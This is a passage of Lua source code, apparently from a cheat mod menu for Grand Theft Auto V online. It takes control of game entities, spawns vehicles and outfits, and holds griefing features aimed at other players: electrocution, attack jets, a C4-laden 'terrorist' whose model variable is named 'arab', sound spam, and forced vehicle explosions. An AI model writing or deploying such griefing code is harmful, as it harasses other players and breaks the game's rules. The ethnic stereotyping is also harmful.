                if getPersonalVeh() ~= vehicle[i] then
                    if s.has_control(vehicle[i]) then
                        VEHICLE.SET_VEHICLE_TYRE_FIXED(vehicle[i], 0)
                        VEHICLE.SET_VEHICLE_TYRE_FIXED(vehicle[i], 1)
                        VEHICLE.SET_VEHICLE_TYRE_FIXED(vehicle[i], 2)
                        VEHICLE.SET_VEHICLE_TYRE_FIXED(vehicle[i], 3)
                        VEHICLE.SET_VEHICLE_TYRE_FIXED(vehicle[i], 4)
                        VEHICLE.SET_VEHICLE_TYRE_FIXED(vehicle[i], 5)
                        VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(vehicle[i], true)
                        VEHICLE.SET_VEHICLE_TYRE_BURST(vehicle[i], 0, true, 1000.0)
                        VEHICLE.SET_VEHICLE_TYRE_BURST(vehicle[i], 1, true, 1000.0)
                        VEHICLE.SET_VEHICLE_TYRE_BURST(vehicle[i], 2, true, 1000.0)
                        VEHICLE.SET_VEHICLE_TYRE_BURST(vehicle[i], 3, true, 1000.0)
                        VEHICLE.SET_VEHICLE_TYRE_BURST(vehicle[i], 4, true, 1000.0)
                        VEHICLE.SET_VEHICLE_TYRE_BURST(vehicle[i], 5, true, 1000.0)
                    end
                end
            end
        end
        s.wait(500)
    end
end
function SpammyDoors()
    while spammydoors do
        local vehicle = getAllVehs()
        get_control_of_entities(vehicle)
        wait()
        for i = 1, #vehicle do
            if vehicle[i] ~= get.veh(get.id()) then
                if getPersonalVeh() ~= vehicle[i] then
                    if s.has_control(vehicle[i]) then
                        for j = 0, 5 do
                            VEHICLE.SET_VEHICLE_DOOR_OPEN(vehicle[i], j, false, false)
                        end
                    end
                end
            end
        end
        s.wait(500)
        local vehicle = getAllVehs()
        get_control_of_entities(vehicle)
        wait()
        for i = 1, #vehicle do
            if vehicle[i] ~= get.veh(get.id()) then
                if getPersonalVeh() ~= vehicle[i] then
                    if s.has_control(vehicle[i]) then
                        VEHICLE.SET_VEHICLE_DOORS_SHUT(vehicle[i], false)
                    end
                end
            end
        end
        s.wait(500)
    end
end
function DelCams()
    while delete_cams do
        if not CUTSCENE.IS_CUTSCENE_PLAYING() then
            local objects = getAllProps()
            for i = 1, #objects do
                local hash = ENTITY.GET_ENTITY_MODEL(objects[i])
                if
                    hash == 4121760380 or hash == 3061645218 or hash == 548760764 or hash == 2135655372 or
                        hash == 4047557484
                 then
                    rqCtrl(objects[i])
                    delEnt(objects[i])
                end
            end
        end
        s.wait(100)
    end
end
function KillEnemies()
    while kill_enemies do
        if not CUTSCENE.IS_CUTSCENE_PLAYING() then
            local peds = getAllPeds(200)
            for i = 1, #peds do
                if not ENTITY.IS_ENTITY_DEAD(peds[i]) then
                    local hash = ENTITY.GET_ENTITY_MODEL(peds[i])
                    for _, v in ipairs(enemies) do
                        if hash == v then
                            get.control(peds[i])
                            PED.SET_PED_HEALTH(peds[i], 0)
                        end
                    end
                end
            end
        end
        s.wait(100)
    end
end
function ShotEnemies()
    while shot_enemies do
        if not CUTSCENE.IS_CUTSCENE_PLAYING() then
            local peds, ped = getAllPeds(50), get.ped_id()
            for i = 1, #peds do
                if not ENTITY.IS_ENTITY_DEAD(peds[i]) then
                    local hash = ENTITY.GET_ENTITY_MODEL(peds[i])
                    for _, v in ipairs(enemies) do
                        if hash == v then
                            local pos = get.offset_coords(peds[i], 0, 0, 0)
                            if pos.x ~= 0 and pos.y ~= 0 and pos.z ~= 0 then
                                GAMEPLAY.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(
                                    pos.x,
                                    pos.y,
                                    pos.z + 1,
                                    pos.x,
                                    pos.y,
                                    pos.z - 1,
                                    1000000,
                                    true,
                                    177293209,
                                    ped,
                                    false,
                                    false,
                                    10000
                                )
                            end
                        end
                    end
                    s.wait(10)
                end
            end
        end
        s.wait(100)
    end
end
function DelEnemies()
    while delete_enemies do
        if not CUTSCENE.IS_CUTSCENE_PLAYING() then
            local peds = getAllPeds(200)
            for i = 1, #peds do
                local hash = ENTITY.GET_ENTITY_MODEL(peds[i])
                for _, v in ipairs(enemies) do
                    if hash == v then
                        delEnt(peds[i])
                    end
                end
            end
        end
        s.wait(100)
    end
end
function RepairNearby()
    while repairnearby do
        local vehicle = getAllVehs(50)
        get_control_of_entities(vehicle)
        wait()
        for i = 1, #vehicle do
            if vehicle[i] ~= get.veh(get.id()) then
                if vehicle[i] ~= getPersonalVeh() then
                    if s.has_control(vehicle[i]) then
                        FIRE.STOP_ENTITY_FIRE(vehicle[i])
                        VEHICLE.SET_VEHICLE_FIXED(vehicle[i])
                        VEHICLE.SET_VEHICLE_DEFORMATION_FIXED(vehicle[i])
                        VEHICLE.SET_VEHICLE_ENGINE_HEALTH(vehicle[i], 1000)
                        FIRE.STOP_ENTITY_FIRE(vehicle[i])
                        VEHICLE.SET_VEHICLE_UNDRIVEABLE(vehicle[i], false)
                        if ENTITY.IS_ENTITY_UPSIDE_DOWN(vehicle[i]) then
                            VEHICLE.SET_VEHICLE_ON_GROUND_PROPERLY(vehicle[i], 5)
                        end
                    end
                end
            end
        end
        s.wait(100)
    end
end
function GodNearby()
    while godnearby do
        local vehicle = getAllVehs(100)
        get_control_of_entities(vehicle)
        wait()
        for i = 1, #vehicle do
            if vehicle[i] ~= get.veh(get.id()) then
                if vehicle[i] ~= getPersonalVeh() then
                    if s.has_control(vehicle[i]) then
                        ENTITY.SET_ENTITY_INVINCIBLE(vehicle[i], true)
                    end
                end
            end
        end
        wait()
    end
    if godnearby == false then
        local vehicle = getAllVehs()
        get_control_of_entities(vehicle)
        wait()
        for i = 1, #vehicle do
            if vehicle[i] ~= get.veh(get.id()) then
                if vehicle[i] ~= getPersonalVeh() then
                    if s.has_control(vehicle[i]) then
                        ENTITY.SET_ENTITY_INVINCIBLE(vehicle[i], false)
                    end
                end
            end
        end
    end
end
function LaunchUpVehicles()
    while launchvehices do
        local vehicle = getAllVehs()
        get_control_of_entities(vehicle)
        wait()
        for i = 1, #vehicle do
            if vehicle[i] ~= get.veh(get.id()) then
                if vehicle[i] ~= getPersonalVeh() then
                    if s.has_control(vehicle[i]) then
                        s.apply_force(vehicle[i], 1, 0, 0, 100, true, false, true, false)
                    end
                end
            end
        end
        wait()
    end
end
function LaunchUpPeds()
    while launchpeds do
        local peds = getAllPeds()
        get_control_of_entities(getAllPeds())
        wait()
        for i = 1, #peds do
            if not PED.IS_PED_A_PLAYER(peds[i]) then
                s.apply_force(peds[i], 1, 0, 0, 100, true, false, true, false)
            end
        end
        wait()
    end
end
function WaypointAirstrike()
    local playerped = get.ped_id()
    while waypoitstrike == true do
        local blipid = UI.GET_WAYPOINT_BLIP_ENUM_ID()
        local blip = UI.GET_FIRST_BLIP_INFO_ID(blipid)
        if UI.DOES_BLIP_EXIST(blip) then
            airstrike = UI.GET_BLIP_INFO_ID_COORD(blip)
            local x = random(floor(airstrike.x - 10), floor(airstrike.x + 10))
            local y = random(floor(airstrike.y - 10), floor(airstrike.y + 10))
            GAMEPLAY.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(
                airstrike.x,
                airstrike.y,
                airstrike.z + 100,
                airstrike.x,
                airstrike.y,
                airstrike.z - 10,
                1,
                true,
                -1312131151,
                playerped,
                true,
                false,
                5000
            )
            s.wait(100)
            GAMEPLAY.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(
                x,
                y,
                airstrike.z + 100,
                x,
                y,
                airstrike.z - 10,
                1,
                true,
                -1312131151,
                playerped,
                true,
                false,
                5000
            )
            if waypoitstrike == false then
                break
            end
            s.wait(500)
        end
        wait()
    end
end
function GhostRider()
    local sanctushash = 1491277511
    local ped = get.ped_id()
    local pos = get.offset_coords(ped, 0, 2, 0)
    local heading = ENTITY.GET_ENTITY_HEADING(ped)
    local sanctus = nil
    local chains = {}
    if ghost_rider == true then
        if table_settings[4][2] == true then
            g_util.play_wav_file(file["GhostRider"], false, false)
        end
        update_outfit()
        rqModel(sanctushash)
        sanctus = set.veh(sanctushash, pos.x, pos.y, pos.z, heading, true, false, false)
        set.model_as_noneeded(sanctushash)
        VEHICLE.SET_VEHICLE_MOD_KIT(sanctus, 0)
        local modindex = {11, 12, 13, 16, 18}
        local modtype = {3, 2, 2, 4, 1}
        for i = 1, #modindex do
            if VEHICLE.GET_VEHICLE_MOD(sanctus, modindex[i]) ~= modtype[i] then
                set.veh_mod(sanctus, modindex[i], modtype[i], false)
            end
        end
        sanctusblip = UI.ADD_BLIP_FOR_ENTITY(sanctus)
        UI.SET_BLIP_SPRITE(sanctusblip, 494)
        set.freeze(sanctus, true)
        VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(sanctus, false)
        VEHICLE.SET_VEHICLE_COLOURS(sanctus, 126, 126)
        VEHICLE.SET_VEHICLE_CUSTOM_PRIMARY_COLOUR(sanctus, 0, 0, 0)
        VEHICLE.SET_VEHICLE_CUSTOM_SECONDARY_COLOUR(sanctus, 0, 0, 0)
        VEHICLE.SET_VEHICLE_EXTRA_COLOURS(sanctus, 0, 0)
        VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(sanctus, "RIDER")
        fire1 = set.obj(-1106953345, pos.x, pos.y, pos.z, true, false, false)
        fire2 = set.obj(-1106953345, pos.x, pos.y, pos.z, true, false, false)
        s.attach(fire1, sanctus, 0, 0, 0.8, -0.2, 0, 0, 0, false, true, false, false, 5, true)
        s.attach(fire2, sanctus, 0, 0, -0.8, -0.2, 0, 0, 0, false, true, false, false, 5, true)
        GRAPHICS.USE_PARTICLE_FX_ASSET("core")
        while not GRAPHICS.HAS_NAMED_PTFX_ASSET_LOADED("core") do
            GRAPHICS.REQUEST_NAMED_PTFX_ASSET("core")
            wait()
        end
        flame1 =
            GRAPHICS.START_PARTICLE_FX_LOOPED_ON_ENTITY(
            "ent_amb_beach_campfire",
            fire1,
            0,
            0,
            0,
            0,
            0,
            0,
            1,
            false,
            false,
            false
        )
        GRAPHICS.SET_PARTICLE_FX_LOOPED_SCALE(flame1, 1)
        GRAPHICS.USE_PARTICLE_FX_ASSET("core")
        while not GRAPHICS.HAS_NAMED_PTFX_ASSET_LOADED("core") do
            GRAPHICS.REQUEST_NAMED_PTFX_ASSET("core")
            wait()
        end
        flame2 =
            GRAPHICS.START_PARTICLE_FX_LOOPED_ON_ENTITY(
            "ent_amb_beach_campfire",
            fire2,
            0,
            0,
            0,
            0,
            0,
            0,
            1,
            false,
            false,
            false
        )
        GRAPHICS.SET_PARTICLE_FX_LOOPED_SCALE(flame2, 1)
        VEHICLE.SET_VEHICLE_STRONG(sanctus, true)
        rqCtrl(sanctus)
        VEHICLE.EXPLODE_VEHICLE(sanctus, false, false, true)
        SetVehicleGod(sanctus, true)
        s.wait(500)
        local chain = -1289626238
        for i = 1, #ghostrider_chains do
            chains[i] = set.obj(chain, pos.x, pos.y, pos.z, true, false, false)
            s.attach(
                chains[i],
                ped,
                38,
                ghostrider_chains[i][1],
                ghostrider_chains[i][2],
                ghostrider_chains[i][3],
                ghostrider_chains[i][4],
                ghostrider_chains[i][5],
                ghostrider_chains[i][6],
                false,
                true,
                false,
                false,
                5,
                true
            )
        end
        s.wait(500)
        GRAPHICS.USE_PARTICLE_FX_ASSET("core")
        while not GRAPHICS.HAS_NAMED_PTFX_ASSET_LOADED("core") do
            GRAPHICS.REQUEST_NAMED_PTFX_ASSET("core")
            wait()
        end
        flame3 =
            GRAPHICS.START_PARTICLE_FX_LOOPED_ON_ENTITY(
            "ent_amb_beach_campfire",
            chains[1],
            0.190000423,
            -0.0799999833,
            -0.200000033,
            0,
            0,
            0,
            0.7,
            false,
            false,
            false
        )
        GRAPHICS.SET_PARTICLE_FX_LOOPED_SCALE(flame3, 0.7)
        PED.SET_PED_INTO_VEHICLE(ped, sanctus, -1)
        set.freeze(sanctus, false)
        FIRE.STOP_ENTITY_FIRE(sanctus)
        while ghost_rider == true do
            if PED.IS_PED_MODEL(ped, female) then
                PED.CLEAR_ALL_PED_PROPS(ped)
                for i = 1, #ghostrider_outfit_female do
                    set.comp_var(ped, i - 1, ghostrider_outfit_female[i][1], ghostrider_outfit_female[i][2], 0)
                end
            elseif PED.IS_PED_MODEL(ped, male) then
                PED.CLEAR_ALL_PED_PROPS(ped)
                for i = 1, #ghostrider_outfit_male do
                    set.comp_var(ped, i - 1, ghostrider_outfit_male[i][1], ghostrider_outfit_male[i][2], 0)
                end
            end
            VEHICLE.SET_VEHICLE_ENGINE_ON(sanctus, true, true, false)
            VEHICLE.SET_VEHICLE_ENGINE_HEALTH(sanctus, 1000)
            if ghost_rider == false then
                break
            end
            wait()
        end
        if ghost_rider == false then
            s.clear_task(ped)
            UI.REMOVE_BLIP(sanctusblip)
            s.delete(fire1)
            s.delete(fire2)
            s.delete(sanctus)
            for i = 1, #chains do
                s.delete(chains[i])
            end
            PED.CLEAR_ALL_PED_PROPS(ped)
            local foutfitcomps = {
                {Face, Facetexture},
                {Mask, Masktexture},
                {Hair, Hairtexture},
                {Torso, Torsotexture},
                {Leg, Legtexture},
                {Parachute, Parachutetexture},
                {Shoes, Shoestexture},
                {Accessory, Accessorytexture},
                {Undershirt, Undershirttexture},
                {Kevlar, Kevlartexture},
                {Badge, Badgetexture},
                {Torso2, Torso2texture}
            }
            local foutfitprops = {{Hat, Hattexture}, {Glasses, Glassestexture}, {Ear, Eartexture}}
            for i = 1, #foutfitcomps do
                set.comp_var(ped, i - 1, foutfitcomps[i][1], foutfitcomps[i][2], 0)
            end
            for i = 1, #foutfitprops do
                set.prop(ped, 0, foutfitprops[i][1], foutfitprops[i][2], true)
            end
        end
    end
end
function PoliceMode()
    local ped = get.ped_id()
    if policeMode then
        s.notify(text["Loading Police Mode,DON'T TOGGLE OFF YET!!!,please wait..."], 3000)
        update_outfit()
        s.wait(100)
        local pos = get.offset_coords(ped, 0, 5, 1)
        local heading = ENTITY.GET_ENTITY_HEADING(ped)
        local veh1 = get.hash("gauntlet4")
        rqModel(veh1)
        hellfire = set.veh(veh1, pos.x, pos.y, pos.z, heading, true, false, false)
        set.model_as_noneeded(veh1)
        rqCtrl(hellfire)
        SetVehicleGod(hellfire, true)
        VEHICLE.SET_VEHICLE_STRONG(hellfire, true)
        VEHICLE.SET_VEHICLE_CAN_BE_VISIBLY_DAMAGED(hellfire, false)
        hellfireblip = UI.ADD_BLIP_FOR_ENTITY(hellfire)
        UI.SET_BLIP_SPRITE(hellfireblip, 672)
        VEHICLE.SET_VEHICLE_MOD_KIT(hellfire, 0)
        VEHICLE.SET_VEHICLE_COLOURS(hellfire, 160, 160)
        VEHICLE.SET_VEHICLE_CUSTOM_PRIMARY_COLOUR(hellfire, 0, 0, 0)
        VEHICLE.SET_VEHICLE_CUSTOM_SECONDARY_COLOUR(hellfire, 0, 0, 0)
        VEHICLE.SET_VEHICLE_EXTRA_COLOURS(hellfire, 0, 0)
        VEHICLE.SET_VEHICLE_NUMBER_PLATE_INDEX(hellfire, 5)
        VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(hellfire, "POLICE")
        set.veh_mod(hellfire, 0, 0, false)
        set.veh_mod(hellfire, 1, 4, false)
        set.veh_mod(hellfire, 3, 1, false)
        set.veh_mod(hellfire, 6, 0, false)
        set.veh_mod(hellfire, 7, 0, false)
        set.veh_mod(hellfire, 8, 2, false)
        set.veh_mod(hellfire, 9, 8, false)
        set.veh_mod(hellfire, 11, 3, false)
        set.veh_mod(hellfire, 12, 2, false)
        set.veh_mod(hellfire, 13, 2, false)
        set.veh_mod(hellfire, 14, 1, false)
        set.veh_mod(hellfire, 15, 3, false)
        set.veh_mod(hellfire, 16, 4, false)
        set.veh_tog_mod(hellfire, 17, false)
        set.veh_tog_mod(hellfire, 18, true)
        set.veh_tog_mod(hellfire, 19, false)
        set.veh_tog_mod(hellfire, 20, false)
        set.veh_tog_mod(hellfire, 21, false)
        set.veh_tog_mod(hellfire, 22, true)
        set.veh_mod(hellfire, 23, 15, true)
        VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(hellfire, false)
        VEHICLE.SET_VEHICLE_WINDOW_TINT(hellfire, 1)
        VEHICLE.SET_VEHICLE_ENGINE_ON(hellfire, true, true, false)
        local veh2 = get.hash("fbi")
        rqModel(veh2)
        fib = set.veh(veh2, pos.x, pos.y, pos.z + 5, heading, true, false, false)
        set.model_as_noneeded(veh2)
        rqCtrl(fib)
        SetVehicleGod(fib, true)
        VEHICLE.SET_VEHICLE_STRONG(fib, true)
        VEHICLE.SET_VEHICLE_CAN_BE_VISIBLY_DAMAGED(fib, false)
        fibblip = UI.ADD_BLIP_FOR_ENTITY(fib)
        UI.SET_BLIP_SPRITE(fibblip, 672)
        VEHICLE.SET_VEHICLE_MOD_KIT(fib, 0)
        VEHICLE.SET_VEHICLE_COLOURS(fib, 160, 160)
        VEHICLE.SET_VEHICLE_CUSTOM_PRIMARY_COLOUR(fib, 0, 0, 0)
        VEHICLE.SET_VEHICLE_CUSTOM_SECONDARY_COLOUR(fib, 0, 0, 0)
        VEHICLE.SET_VEHICLE_EXTRA_COLOURS(fib, 0, 0)
        VEHICLE.SET_VEHICLE_NUMBER_PLATE_INDEX(fib, 5)
        VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(fib, " POLICE")
        set.veh_mod(fib, 11, 3, false)
        set.veh_mod(fib, 12, 2, false)
        set.veh_mod(fib, 13, 2, false)
        set.veh_mod(fib, 15, 3, false)
        set.veh_mod(fib, 16, 4, false)
        set.veh_tog_mod(fib, 17, false)
        set.veh_tog_mod(fib, 18, true)
        set.veh_tog_mod(fib, 19, false)
        set.veh_tog_mod(fib, 20, false)
        set.veh_tog_mod(fib, 21, false)
        set.veh_tog_mod(fib, 22, true)
        VEHICLE.SET_VEHICLE_WINDOW_TINT(fib, 1)
        VEHICLE.SET_VEHICLE_ENGINE_ON(fib, true, true, false)
        s.attach(fib, hellfire, 0, 0, -0.0999999866, 0.25000003, 0, 0, 0, false, true, false, false, 5, true)
        set.freeze(fib, true)
        set.collision(fib, false, true)
        VEHICLE.SET_VEHICLE_BRAKE_LIGHTS(hellfire, true)
        PED.SET_PED_INTO_VEHICLE(ped, hellfire, -1)
        local model = get.hash("ig_lestercrest_2")
        rqModel(model)
        les = set.ped(6, model, pos.x, pos.y, pos.z, heading, true, false)
        set.godmode(les, true)
        set.model_as_noneeded(model)
        PED.SET_PED_INTO_VEHICLE(les, fib, -1)
        set.collision(les, false, true)
        set.ped_combat(les, 46, true)
        set.ped_combat(les, 52, true)
        set.ped_combat(les, 1, true)
        set.ped_combat(les, 2, true)
        set.ped_combat(les, 5, true)
        PED.SET_PED_COMBAT_RANGE(les, 2)
        PED.SET_PED_COMBAT_ABILITY(les, 2)
        PED.SET_PED_COMBAT_MOVEMENT(les, 2)
        TASK.TASK_VEHICLE_AIM_AT_PED(les, ped)
        rqCtrl(fib)
        set.locked(fib, 6)
        set.locked(fib, 4)
        ENTITY.SET_ENTITY_VISIBLE(les, false, false)
        ENTITY.SET_ENTITY_LIGHTS(hellfire, true)
        s.give_weapon(ped, 1737195953, 9999, false)
        s.give_weapon(ped, 911657153, 9999, false)
        s.notify(text["Police Mode Loaded! Have Fun! :)"], 3000)
        while policeMode == true do
            if PLAYER.IS_PLAYER_PRESSING_HORN(get.id()) then
                s.wait(100)
                rqCtrl(fib)
                if VEHICLE.IS_VEHICLE_SIREN_ON(fib) == false then
                    VEHICLE.SET_VEHICLE_SIREN(fib, true)
                else
                    VEHICLE.SET_VEHICLE_SIREN(fib, false)
                end
            end
            if PED.IS_PED_MODEL(ped, female) then
                PED.CLEAR_ALL_PED_PROPS(ped)
                for i = 1, #police_outfit_female do
                    set.comp_var(ped, i - 1, police_outfit_female[i][1], police_outfit_female[i][2], 0)
                    if i < 2 then
                        set.prop(ped, i - 1, police_outfit_female[i][3], police_outfit_female[i][4], true)
                    end
                end
            elseif PED.IS_PED_MODEL(ped, male) then
                PED.CLEAR_ALL_PED_PROPS(ped)
                for i = 1, #police_outfit_male do
                    set.comp_var(ped, i - 1, police_outfit_male[i][1], police_outfit_male[i][2], 0)
                    if i < 4 then
                        set.prop(ped, i - 1, police_outfit_male[i][3], police_outfit_male[i][4], true)
                    end
                end
            end
            s.wait(10)
            if policeMode == false then
                break
            end
        end
    elseif policeMode == false then
        s.clear_task(ped)
        rqCtrl(les)
        s.delete(les)
        rqCtrl(fib)
        s.delete(fib)
        UI.REMOVE_BLIP(fibblip)
        rqCtrl(hellfire)
        UI.REMOVE_BLIP(hellfireblip)
        s.delete(hellfire)
        PED.CLEAR_ALL_PED_PROPS(ped)
        local foutfitcomps = {
            {Face, Facetexture},
            {Mask, Masktexture},
            {Hair, Hairtexture},
            {Torso, Torsotexture},
            {Leg, Legtexture},
            {Parachute, Parachutetexture},
            {Shoes, Shoestexture},
            {Accessory, Accessorytexture},
            {Undershirt, Undershirttexture},
            {Kevlar, Kevlartexture},
            {Badge, Badgetexture},
            {Torso2, Torso2texture}
        }
        local foutfitprops = {{Hat, Hattexture}, {Glasses, Glassestexture}, {Ear, Eartexture}}
        for i = 1, #foutfitcomps do
            set.comp_var(ped, i - 1, foutfitcomps[i][1], foutfitcomps[i][2], 0)
        end
        for i = 1, #foutfitprops do
            set.prop(ped, 0, foutfitprops[i][1], foutfitprops[i][2], true)
        end
    end
end
function ShowInvisible()
    local pid = get.selected()
    while show_invisible[pid] do
        if pid ~= get.id() then
            PLAYER.SET_PLAYER_VISIBLE_LOCALLY(pid, true)
        end
        wait()
    end
end
function SendJets()
    local pid = get.selected()
    if jetLester[pid] then
        local pedp = get.ped(pid)
        for i = 1, jetsAmount do
            local pos = get.offset_coords(pedp, random(-100, 100), random(-100, 100), 400 + random(0, 100))
            local heading = random(0, 359)
            local model = get.hash("ig_lestercrest_2")
            rqModel(model)
            local i = #lesterjet + 1
            lesterjet[i] = set.ped(6, model, pos.x, pos.y, pos.z, heading, true, false)
            set.model_as_noneeded(model)
            if table_settings[5][2] == true then
                SetVehicleGod(lesterjet[i], true)
            end
            local vehhash = get.hash("Lazer")
            rqModel(vehhash)
            local y = #lesjet + 1
            lesjet[y] = set.veh(vehhash, pos.x, pos.y, pos.z, heading, true, false, false)
            set.model_as_noneeded(vehhash)
            rqCtrl(lesjet[y])
            VEHICLE.CONTROL_LANDING_GEAR(lesjet[y], 3)
            VEHICLE.SET_HELI_BLADES_FULL_SPEED(lesjet[y])
            VEHICLE.SET_VEHICLE_FORWARD_SPEED(lesjet[y], 100)
            if table_settings[5][2] == true then
                SetVehicleGod(lesjet[y], true)
            end
            set.locked(lesjet[y], 5)
            PED.SET_PED_ACCURACY(lesterjet[i], 100)
            set.ped_combat(lesterjet[i], 46, true)
            set.ped_combat(lesterjet[i], 52, true)
            set.ped_combat(lesterjet[i], 1, true)
            set.ped_combat(lesterjet[i], 2, true)
            set.ped_combat(lesterjet[i], 5, true)
            PED.SET_PED_COMBAT_RANGE(lesterjet[i], 2)
            PED.SET_PED_COMBAT_ABILITY(lesterjet[i], 2)
            PED.SET_PED_COMBAT_MOVEMENT(lesterjet[i], 2)
            PED.SET_PED_INTO_VEHICLE(lesterjet[i], lesjet[y], -1)
            TASK.TASK_COMBAT_PED(lesterjet[i], pedp, 0, 16)
            set.locked(lesjet[y], 6)
            set.locked(lesjet[y], 2)
        end
    elseif jetLester[pid] == false then
        local vehs = getAllVehs()
        for i = 1, #vehs do
            if VEHICLE.IS_VEHICLE_MODEL(vehs[i], -1281684762) then
                local lester = VEHICLE.GET_PED_IN_VEHICLE_SEAT(vehs[i], -1, false)
                if PED.IS_PED_MODEL(lester, get.hash("ig_lestercrest_2")) then
                    rqCtrl(lester)
                    delEnt(lester)
                    rqCtrl(vehs[i])
                    delEnt(vehs[i])
                end
            end
        end
    end
    while jetLester[pid] do
        local vehs = getAllVehs()
        for i = 1, #vehs do
            if VEHICLE.IS_VEHICLE_MODEL(vehs[i], -1281684762) then
                local speed = ENTITY.GET_ENTITY_SPEED(vehs[i])
                local lester = VEHICLE.GET_PED_IN_VEHICLE_SEAT(vehs[i], -1, false)
                if PED.IS_PED_MODEL(lester, get.hash("ig_lestercrest_2")) then
                    rqCtrl(lester)
                    local pedp = get.ped(pid)
                    if not ENTITY.IS_ENTITY_DEAD(pedp) then
                        TASK.TASK_COMBAT_PED(lester, pedp, 0, 16)
                    end
                    if speed < 3 then
                        local coords = get.offset_coords(vehs[i], 0, 0, 0)
                        rqCtrl(vehs[i])
                        set.coords_no_off(vehs[i], coords.x, coords.y, coords.z + 200)
                        VEHICLE.SET_VEHICLE_FORWARD_SPEED(vehs[i], 100)
                    end
                end
            end
        end
        if not s.is_valid(pid) then
            return
        end
        wait()
    end
end
function Electrocute(pid)
    while electrocute[pid] do
        if not s.is_valid(pid) then
            return
        end
        local pos = get.coords(pid)
        GAMEPLAY.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(
            pos.x,
            pos.y,
            pos.z + 1,
            pos.x,
            pos.y,
            pos.z - 1,
            0,
            true,
            911657153,
            get.ped_id(),
            false,
            true,
            10000
        )
        wait()
    end
end --[[ function DisableGod(player) while disablegod[player]==true do s.send_se(player,{801199324,player,869796886,0}) s.wait(10) end end ]]
function SendTerrorist()
    s.notify(text["PRESS G TO DETONATE"], 5000)
    local player = get.selected()
    local playerped = get.ped(player)
    local arab = 1885233650
    rqModel(arab)
    rqModel(-1266278729)
    local coords = get.offset_coords(playerped, 0, -10, 0)
    local heading = ENTITY.GET_ENTITY_HEADING(playerped)
    local terrorist = set.ped(1, arab, coords.x, coords.y, coords.z, heading, true, false)
    for i = 1, #terrorist_outfit do
        set.comp_var(terrorist, i - 1, terrorist_outfit[i][1], terrorist_outfit[i][2], 0)
    end
    local c4 = OBJECT.CREATE_WORLD_OBJECT(-1266278729, coords.x, coords.y - 10, coords.z, true, false)
    s.attach(c4, terrorist, 0, 0, 0.2, 0.2, 180, 0, 0, true, true, false, false, 0, true)
    local c4 = OBJECT.CREATE_WORLD_OBJECT(-1266278729, coords.x, coords.y - 10, coords.z, true, false)
    s.attach(c4, terrorist, 0, 0.1, 0.2, 0.2, 180, 0, 0, true, true, false, false, 0, true)
    local c4 = OBJECT.CREATE_WORLD_OBJECT(-1266278729, coords.x, coords.y - 10, coords.z, true, false)
    s.attach(c4, terrorist, 0, -0.1, 0.2, 0.2, 180, 0, 0, true, true, false, false, 0, true)
    set.model_as_noneeded(arab)
    set.model_as_noneeded(-1266278729)
    if table_settings[5][2] == true then
        set.godmode(terrorist, true)
    end
    PED.SET_PED_HEALTH(terrorist, 500)
    set.ped_combat(terrorist, 46, true)
    set.ped_combat(terrorist, 52, true)
    set.ped_combat(terrorist, 1, true)
    set.ped_combat(terrorist, 2, true)
    set.ped_combat(terrorist, 5, true)
    PED.SET_PED_COMBAT_RANGE(terrorist, 2)
    PED.SET_PED_COMBAT_ABILITY(terrorist, 2)
    PED.SET_PED_COMBAT_MOVEMENT(terrorist, 2)
    TASK.TASK_COMBAT_PED(terrorist, playerped, 0, 16)
    while s.ent_exist(terrorist) do
        if get.inputcontrol(0, C.INPUT_DETONATE) then
            rqCtrl(terrorist)
            set.godmode(terrorist, false)
            s.wait(100)
            local pos = get.ent_coords(terrorist)
            set.explosion(pos.x, pos.y, pos.z, 29, 10, true, false, 1, false)
            set.explosion(pos.x + 2, pos.y, pos.z, 29, 10, true, false, 1, false)
            set.explosion(pos.x - 2, pos.y, pos.z, 29, 10, true, false, 1, false)
            set.explosion(pos.x, pos.y + 2, pos.z, 29, 10, true, false, 1, false)
            set.explosion(pos.x, pos.y - 2, pos.z, 29, 10, true, false, 1, false)
            break
        end
        if not s.ent_exist(terrorist) then
            break
        end
        if ENTITY.IS_ENTITY_DEAD(terrorist) then
            break
        end
        wait()
    end
end
function EarRape(pid)
    while earrape[pid] do
        local pos = get.coords(pid)
        AUDIO.PLAY_SOUND_FROM_COORD(-1, "07", pos.x, pos.y, pos.z, "DLC_GR_CS2_Sounds", true, 50, true)
        if not s.is_valid(pid) then
            for i = -100, 100 do
                AUDIO.STOP_SOUND(i)
            end
            return
        end
        wait()
    end
    if not earrape[pid] then
        for i = -100, 100 do
            AUDIO.STOP_SOUND(i)
        end
    end
end
function NeedForSpeed()
    local player = get.selected()
    if nfs[player] then
        local ped = get.ped(player)
        local veh = get.veh(player)
        AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "Bomb_Disarmed", veh, "GTAO_Speed_Convoy_Soundset", true, 0)
    end
    while nfs[player] do
        if get.player_in_veh(player) then
            local ped = get.ped(player)
            local veh = get.veh(player)
            local speed = ENTITY.GET_ENTITY_SPEED(veh)
            function vehicle_check()
                local ped = get.ped(player)
                if ENTITY.IS_ENTITY_DEAD(ped) then
                    return
                end
                if get.player_in_veh(player) then
                    return
                end
                local tick = 0
                while not get.player_in_veh(player) and tick < 10 do
                    if ENTITY.IS_ENTITY_DEAD(ped) then
                        return
                    end
                    tick = tick + 1
                    wait()
                end
                if get.player_in_veh(player) then
                    return
                end
                local time = os.time() + 10
                while not ENTITY.IS_ENTITY_DEAD(ped) do
                    local pos = get.ent_coords(ped)
                    set.explosion(pos.x, pos.y, pos.z, 4, 10, true, false, 1, false)
                    local pos = get.ent_coords(veh)
                    set.explosion(pos.x, pos.y, pos.z, 4, 10, true, false, 1, false)
                    if rqCtrl(veh, 500) then
                        SetVehicleGod(veh, false)
                        VEHICLE.EXPLODE_VEHICLE(veh, true, false, true)
                    end
                    if ENTITY.IS_ENTITY_DEAD(ped) then
                        return
                    end
                    if nfs[player] == false then
                        return
                    end
                    if not s.is_valid(player) then
                        return
                    end
                    if os.time() - time > 10 then
                        return
                    end
                    s.wait(10)
                end
            end
            if not ENTITY.IS_ENTITY_DEAD(ped) then
                if speed < value * 0.277777778 then
